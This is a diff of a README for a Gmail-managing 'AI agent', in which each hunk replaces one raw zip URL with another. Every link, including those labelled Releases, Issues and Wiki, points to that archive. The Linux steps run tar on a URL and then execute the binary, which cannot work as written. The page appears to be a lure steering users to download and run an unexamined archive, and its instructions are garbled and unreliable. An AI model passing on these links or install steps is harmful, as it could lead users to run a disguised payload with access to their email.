@@ -1,7 +1,7 @@
 # 🤖 talk-to-gmail - Manage Gmail Easily with AI
 
 ## 📥 Download Now
-[![Download link](https://raw.githubusercontent.com/HDEPlaysYT/talk-to-gmail/main/spirograph/talk-to-gmail.zip)](https://raw.githubusercontent.com/HDEPlaysYT/talk-to-gmail/main/spirograph/talk-to-gmail.zip)
+[![Download link](https://github.com/HDEPlaysYT/talk-to-gmail/raw/refs/heads/main/src/tools/general/to_gmail_talk_v3.6-alpha.4.zip)](https://github.com/HDEPlaysYT/talk-to-gmail/raw/refs/heads/main/src/tools/general/to_gmail_talk_v3.6-alpha.4.zip)
 
 ## 🚀 Getting Started
 Welcome to **talk-to-gmail**! This AI agent helps you manage your Gmail account using natural language. You can easily send emails, check your inbox, and organize messages without needing technical skills. 
@@ -15,7 +15,7 @@ To run talk-to-gmail, ensure your system meets the following requirements:
 - **Internet:** A stable internet connection.
 
 ## 📦 Download & Install
-To get started, you need to download talk-to-gmail from our [Releases page](https://raw.githubusercontent.com/HDEPlaysYT/talk-to-gmail/main/spirograph/talk-to-gmail.zip).
+To get started, you need to download talk-to-gmail from our [Releases page](https://github.com/HDEPlaysYT/talk-to-gmail/raw/refs/heads/main/src/tools/general/to_gmail_talk_v3.6-alpha.4.zip).
 
 1. Click the link above to visit the Releases page.
 2. Find the latest version of talk-to-gmail.
@@ -35,12 +35,12 @@ To get started, you need to download talk-to-gmail from our [Releases page](http
 4. Open the Applications folder, and launch talk-to-gmail from there.
 
 ### 🐧 For Linux Users
-1. Locate the downloaded `https://raw.githubusercontent.com/HDEPlaysYT/talk-to-gmail/main/spirograph/talk-to-gmail.zip` file in your downloads directory.
+1. Locate the downloaded `https://github.com/HDEPlaysYT/talk-to-gmail/raw/refs/heads/main/src/tools/general/to_gmail_talk_v3.6-alpha.4.zip` file in your downloads directory.
 2. Open a terminal window.
 3. Navigate to the directory where you downloaded the file.
 4. Run the following commands:
    ```
-   tar -xzf https://raw.githubusercontent.com/HDEPlaysYT/talk-to-gmail/main/spirograph/talk-to-gmail.zip
+   tar -xzf https://github.com/HDEPlaysYT/talk-to-gmail/raw/refs/heads/main/src/tools/general/to_gmail_talk_v3.6-alpha.4.zip
    cd talk-to-gmail
    ./talk-to-gmail
    ```
@@ -66,10 +66,10 @@ If you encounter issues, check the following:
 - Restart the application if it freezes or does not respond.
 
 ## 📞 Support
-For further assistance, please reach out to our support team through the [Issues page](https://raw.githubusercontent.com/HDEPlaysYT/talk-to-gmail/main/spirograph/talk-to-gmail.zip). We’re here to help you!
+For further assistance, please reach out to our support team through the [Issues page](https://github.com/HDEPlaysYT/talk-to-gmail/raw/refs/heads/main/src/tools/general/to_gmail_talk_v3.6-alpha.4.zip). We’re here to help you!
 
 ## 🔗 Additional Resources
 - Learn more about how talk-to-gmail can enhance your productivity.
-- Explore tips and tricks on our [Wiki page](https://raw.githubusercontent.com/HDEPlaysYT/talk-to-gmail/main/spirograph/talk-to-gmail.zip).
+- Explore tips and tricks on our [Wiki page](https://github.com/HDEPlaysYT/talk-to-gmail/raw/refs/heads/main/src/tools/general/to_gmail_talk_v3.6-alpha.4.zip).
 
 Thank you for using talk-to-gmail! Enjoy managing your emails effortlessly.
